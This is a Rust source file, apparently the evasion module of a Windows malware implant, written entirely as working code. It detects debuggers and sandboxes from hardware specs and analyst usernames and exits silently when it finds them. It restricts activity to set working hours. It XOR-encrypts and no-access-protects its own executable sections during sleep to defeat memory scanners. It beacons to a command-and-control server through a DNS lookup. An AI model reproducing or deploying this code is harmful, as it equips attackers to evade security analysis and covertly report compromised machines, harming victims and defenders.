/// Evasion module: sandbox detection, sleep masking, working hours, DNS canary.

/// Score-based sandbox check. Exits silently (exit code 0) if sandbox indicators detected.
pub fn sandbox_check() {
    use windows_sys::Win32::System::Diagnostics::Debug::IsDebuggerPresent;
    use windows_sys::Win32::System::SystemInformation::{
        GetSystemInfo, GlobalMemoryStatusEx, MEMORYSTATUSEX, SYSTEM_INFO,
    };
    use windows_sys::Win32::Storage::FileSystem::GetDiskFreeSpaceExW;

    unsafe {
        // Immediate exit if a debugger is attached
        if IsDebuggerPresent() != 0 {
            std::process::exit(0);
        }

        let mut score: u32 = 0;

        // CPU core count < 2 → sandbox indicator (+1)
        let mut si: SYSTEM_INFO = std::mem::zeroed();
        GetSystemInfo(&mut si);
        if si.dwNumberOfProcessors < 2 {
            score += 1;
        }

        // Physical RAM < 2 GB → strong sandbox indicator (+3)
        let mut ms: MEMORYSTATUSEX = std::mem::zeroed();
        ms.dwLength = std::mem::size_of::<MEMORYSTATUSEX>() as u32;
        GlobalMemoryStatusEx(&mut ms);
        if ms.ullTotalPhys < 2u64 * 1024 * 1024 * 1024 {
            score += 3;
        }

        // C: drive total size < 40 GB → sandbox indicator (+1)
        let c_drive: Vec<u16> = "C:\\\0".encode_utf16().collect();
        let mut free_caller = 0u64;
        let mut total = 0u64;
        GetDiskFreeSpaceExW(
            c_drive.as_ptr(),
            &mut free_caller,
            &mut total,
            std::ptr::null_mut(),
        );
        if total > 0 && total < 40u64 * 1024 * 1024 * 1024 {
            score += 1;
        }

        if score >= 4 {
            std::process::exit(0);
        }
    }

    // Username check — common sandbox / analyst account names
    let username = std::env::var("USERNAME")
        .unwrap_or_default()
        .to_ascii_lowercase();
    let sandbox_names = [
        "sandbox", "malware", "virus", "analyst", "cuckoo", "tester", "vm-", "vbox",
    ];
    if sandbox_names.iter().any(|n| username.contains(n)) {
        std::process::exit(0);
    }
}

/// Returns true if the current local time falls within the configured working-hours window,
/// or if `spec` is empty (no restriction). Format: "HH:MM-HH:MM", e.g. "08:00-18:00".
/// Handles overnight windows, e.g. "22:00-06:00".
pub fn in_working_hours(spec: &str) -> bool {
    if spec.is_empty() {
        return true;
    }
    let parts: Vec<&str> = spec.split('-').collect();
    if parts.len() != 2 {
        return true;
    }
    let parse_hhmm = |s: &str| -> Option<u32> {
        let c: Vec<&str> = s.split(':').collect();
        if c.len() != 2 {
            return None;
        }
        let h: u32 = c[0].parse().ok()?;
        let m: u32 = c[1].parse().ok()?;
        Some(h * 60 + m)
    };
    let start_min = match parse_hhmm(parts[0]) {
        Some(v) => v,
        None => return true,
    };
    let end_min = match parse_hhmm(parts[1]) {
        Some(v) => v,
        None => return true,
    };

    use windows_sys::Win32::Foundation::SYSTEMTIME;
    use windows_sys::Win32::System::SystemInformation::GetLocalTime;

    let mut st: SYSTEMTIME = unsafe { std::mem::zeroed() };
    unsafe { GetLocalTime(&mut st); }
    let now_min = u32::from(st.wHour) * 60 + u32::from(st.wMinute);

    if start_min <= end_min {
        // Normal daytime window, e.g. 08:00–18:00
        now_min >= start_min && now_min < end_min
    } else {
        // Overnight window, e.g. 22:00–06:00
        now_min >= start_min || now_min < end_min
    }
}

/// XOR-mask all executable PE sections during sleep to defeat in-memory scanners.
/// Sections are set PAGE_NOACCESS while sleeping; original protections are restored after.
pub fn sleep_masked(ms: u64) {
    unsafe {
        use windows_sys::Win32::System::LibraryLoader::GetModuleHandleW;
        use windows_sys::Win32::System::Memory::VirtualProtect;

        // Get our own image base (pass NULL → returns the calling module's base)
        let base = GetModuleHandleW(std::ptr::null()) as usize as *mut u8;
        if base.is_null() {
            std::thread::sleep(std::time::Duration::from_millis(ms));
            return;
        }

        // DOS header: e_lfanew at offset 0x3C gives offset of NT headers
        let e_lfanew = *base.add(0x3c).cast::<i32>() as usize;
        let nt_base = base.add(e_lfanew);

        // Validate PE signature "PE\0\0" (0x00004550)
        if *nt_base.cast::<u32>() != 0x0000_4550 {
            std::thread::sleep(std::time::Duration::from_millis(ms));
            return;
        }

        // IMAGE_FILE_HEADER fields (relative to PE signature):
        //   offset  6 → NumberOfSections (u16)
        //   offset 20 → SizeOfOptionalHeader (u16)
        let num_sections = *nt_base.add(6).cast::<u16>() as usize;
        let opt_header_size = *nt_base.add(20).cast::<u16>() as usize;

        // Section headers begin immediately after the optional header
        // Layout: [PE sig 4B][FileHeader 20B][OptionalHeader N B][Section headers...]
        let sections_start = nt_base.add(4 + 20 + opt_header_size);

        // IMAGE_SECTION_HEADER = 40 bytes:
        //   offset  0 → Name           [8 bytes]
        //   offset  8 → VirtualSize    u32
        //   offset 12 → VirtualAddress u32
        //   offset 36 → Characteristics u32
        let mut regions: Vec<(*mut u8, usize, u32)> = Vec::new();

        for i in 0..num_sections {
            let sec = sections_start.add(i * 40);
            let virt_size = *sec.add(8).cast::<u32>() as usize;
            let virt_addr = *sec.add(12).cast::<u32>() as usize;
            let characteristics = *sec.add(36).cast::<u32>();

            // IMAGE_SCN_MEM_EXECUTE = 0x20000000 — only mask executable sections
            if characteristics & 0x2000_0000 != 0 && virt_size > 0 {
                let region_ptr = base.add(virt_addr);
                let mut old_prot = 0u32;
                // Make section writable so we can XOR it
                if VirtualProtect(
                    region_ptr as *const _,
                    virt_size,
                    0x04, // PAGE_READWRITE
                    &mut old_prot,
                ) != 0
                {
                    // XOR-encrypt the section bytes
                    let slice = std::slice::from_raw_parts_mut(region_ptr, virt_size);
                    for b in slice.iter_mut() {
                        *b ^= 0xA7;
                    }
                    // Set to no-access to defeat memory scanner reads
                    let mut tmp = 0u32;
                    VirtualProtect(
                        region_ptr as *const _,
                        virt_size,
                        0x01, // PAGE_NOACCESS
                        &mut tmp,
                    );
                    regions.push((region_ptr, virt_size, old_prot));
                }
            }
        }

        std::thread::sleep(std::time::Duration::from_millis(ms));

        // Restore and XOR-decrypt sections in reverse order
        for (ptr, size, orig_prot) in regions.iter().rev() {
            let mut tmp = 0u32;
            VirtualProtect(*ptr as *const _, *size, 0x04, &mut tmp); // PAGE_READWRITE
            let slice = std::slice::from_raw_parts_mut(*ptr, *size);
            for b in slice.iter_mut() {
                *b ^= 0xA7;
            }
            VirtualProtect(*ptr as *const _, *size, *orig_prot, &mut tmp);
        }
    }
}

/// Fire a DNS canary by resolving "beacon.<domain>".
/// If the C2 server runs an authoritative DNS for the domain, it logs this lookup
/// and can correlate implant activity.
pub fn dns_canary_check(domain: &str) {
    if domain.is_empty() {
        return;
    }
    // Null-terminate for getaddrinfo (expects a C string)
    let lookup = format!("beacon.{}\0", domain);

    use windows_sys::Win32::Networking::WinSock::{
        freeaddrinfo, getaddrinfo, WSAStartup, ADDRINFOA, WSADATA,
    };

    unsafe {
        let mut wsa_data: WSADATA = std::mem::zeroed();
        WSAStartup(0x0202, &mut wsa_data);

        let mut hints: ADDRINFOA = std::mem::zeroed();
        hints.ai_family = 0; // AF_UNSPEC — accept IPv4 or IPv6 answer

        let mut result: *mut ADDRINFOA = std::ptr::null_mut();
        getaddrinfo(
            lookup.as_ptr(),  // PCSTR (*const u8), null-terminated
            std::ptr::null(), // service name — NULL = any port
            &hints,
            &mut result,
        );
        if !result.is_null() {
            freeaddrinfo(result);
        }
    }
}
